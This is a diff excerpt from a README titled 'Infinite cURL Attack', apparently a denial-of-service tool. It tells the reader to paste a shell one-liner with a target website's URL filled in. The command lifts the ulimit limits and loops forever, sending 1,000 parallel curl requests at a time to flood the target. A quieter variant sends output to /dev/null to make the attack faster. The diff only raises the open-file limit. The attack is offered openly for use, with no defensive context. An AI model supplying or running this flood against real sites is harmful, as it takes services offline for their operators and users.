@@ -6,13 +6,13 @@ Infinite cURL Attack
 **USAGE** : Copy-Paste-Edit the following code (replace **_https://Your.Target.Website.com_** with your target website) in the Terminal/CMD & press Enter.  
 
 ```
-ulimit -t unlimited; ulimit -f unlimited; ulimit -m unlimited; ulimit -u unlimited; ulimit -n 1000000; ulimit -s unlimited; ulimit -v unlimited; while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -I -i -v -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com"; done;
+ulimit -t unlimited; ulimit -f unlimited; ulimit -m unlimited; ulimit -u unlimited; ulimit -n 10000000000; ulimit -s unlimited; ulimit -v unlimited; while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -I -i -v -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com"; done;
 ```  
 
 If you don't want logs in your terminal and make the attacks faster, do this (**the following is my preference**):  
 
 ```
-ulimit -t unlimited; ulimit -f unlimited; ulimit -m unlimited; ulimit -u unlimited; ulimit -n 1000000; ulimit -s unlimited; ulimit -v unlimited; while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -s -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com" > /dev/null; done;
+ulimit -t unlimited; ulimit -f unlimited; ulimit -m unlimited; ulimit -u unlimited; ulimit -n 10000000000; ulimit -s unlimited; ulimit -v unlimited; while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -s -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com" > /dev/null; done;
 ```  
 
 **IMPORTANT:**  
